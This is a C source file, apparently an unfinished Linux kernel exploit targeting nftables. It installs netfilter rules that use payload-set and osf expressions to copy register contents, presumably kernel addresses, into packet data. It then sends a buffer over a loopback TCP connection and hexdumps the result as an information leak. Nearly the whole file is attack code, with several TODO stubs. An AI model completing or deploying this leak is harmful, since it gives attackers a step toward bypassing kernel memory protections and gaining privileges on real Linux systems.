#define _GNU_SOURCE
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <stddef.h>
#include "utils.h"
#define BUF_SIZE 0x260
//////////edit////////////
/////////////////////

static struct nftnl_rule *isolate_udp_pkt(uint8_t family, const char *table, const char *chain, const char * target_chain)
{
	struct nftnl_rule *r = NULL;

	r = nftnl_rule_alloc();
	if (r == NULL) {
		perror("OOM");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

	// meta load l4proto => reg 1 
	add_meta(r, NFT_META_L4PROTO, NFT_REG_1); 

    // TODO
	return r;
}

static struct nftnl_rule *edit_udp_data(uint8_t family, const char *table, const char *chain)
{
	struct nftnl_rule *r = NULL;

	r = nftnl_rule_alloc();
	if (r == NULL) {
		perror("OOM");
		exit(EXIT_FAILURE);
	}
	
	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
	
	// *** PREPARE PAYLOAD SET EXPRESSION ***
	// This expression will be used to get the address from a register and write it
	// into the packet
	uint32_t payload_base = NFT_PAYLOAD_TRANSPORT_HEADER;
	uint32_t payload_offset = 32; 
	uint32_t payload_len = 0x10; // 8 bytes -> the address
	uint32_t payload_dreg = NFT_REG_1;// we get it from the first regis//
	uint32_t tmp_reg = NFT_REG_3;
	uint32_t origin_flag = NFT_REG_4;
	add_payload(r, payload_base, 0, origin_flag, 0xd, 0x1);
	add_payload(r, payload_base, 0, tmp_reg, 48, 0x1);
	add_payload_set(r, payload_base, 0xd, 0x1, tmp_reg);

	add_osf(r, payload_dreg);

	add_payload_set(r, payload_base, payload_offset, payload_len, payload_dreg);
	
	add_payload_set(r, payload_base, 0xd, 0x1, origin_flag);

	printf("[*] Payload expression is setup! \n");

	// TODO
	return r;
}


void install_rule_for_leak()
{
	//if(create_rule(isolate_udp_pkt(NFPROTO_IPV4, "filter", "input", "leak")) == 0 ){
	//	perror("error creating rule");
	//	exit(EXIT_FAILURE);
	//}
	if(create_rule(edit_udp_data(NFPROTO_IPV4, "filter", "input")) == 0 ){
		perror("error creating rule");
		exit(EXIT_FAILURE);
	}
}


void tcp_client(void * data){
    // TODO
    int sockfd, portno, n;
    struct sockaddr_in serv_addr;
    struct hostent *server;


    //socket
    portno = atoi("8080");
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) 
        error("ERROR opening socket");

    server = gethostbyname("localhost");
    if (server == NULL) {
        fprintf(stderr, "ERROR, no such host\n");
        exit(0);
    }

    memset((char*)&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(portno);

    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) 
        error("ERROR connecting");
	printf("[-]recved from server\n");
    recv(sockfd, data, BUF_SIZE, 0);
    hexdump(data, BUF_SIZE);
    close(sockfd);
}
void tcp_server(void * data){
    // TODO
	//
	char message[1024] = "hello client\n";
    int port = 8080;

    //initialize server data
    int server_sock;
    struct sockaddr_in serv_addr;
    memset((char*)&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);

    //socket
    if((server_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        perror("socket error");
        exit(1);
    }

    if (bind(server_sock, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        perror("binding error");
        exit(1);
    }

    listen(server_sock, 5);

    int client_socket;
    struct sockaddr_in client_addr;
    socklen_t clilen = sizeof(client_addr);

	client_socket = accept(server_sock, &client_addr, &clilen);


        
    send(client_socket, data, 1024, 0);
    close(client_socket);
    close(server_sock);
	pthread_exit(NULL);
}


int main(int argc, char *argv[])
{

		
    int tid, status;
    pthread_t p_thread;
    unsigned char udpbuf[BUF_SIZE] = {0,};


    memset(udpbuf, 0x02, BUF_SIZE);
//    new_ns();

    system("ip link set lo up");


    tid = pthread_create(&p_thread, NULL, tcp_server, (void *)udpbuf);
    if (tid < 0){
        perror("thread create error : ");
        exit(0);
    }

	printf("  [-] setup nftables\n");

	if(create_table(NFPROTO_IPV4, "filter", false) == 0){
		perror("error creating table");
		exit(EXIT_FAILURE);
	}

	if(create_chain("filter", "input", NF_INET_LOCAL_IN) == 0){
		perror("error creating chain");
		exit(EXIT_FAILURE);
	}

    install_rule_for_leak();

	printf("  [-] send & recv udp packet\n");

	usleep(1000);
    tcp_client(udpbuf);

    pthread_join(p_thread, (void **)&status);
	printf("Data AFter Join: \n");

	////////edit///////////
//	hexdump(udpbuf, BUF_SIZE);
	///////////////////

			
	return 0;
}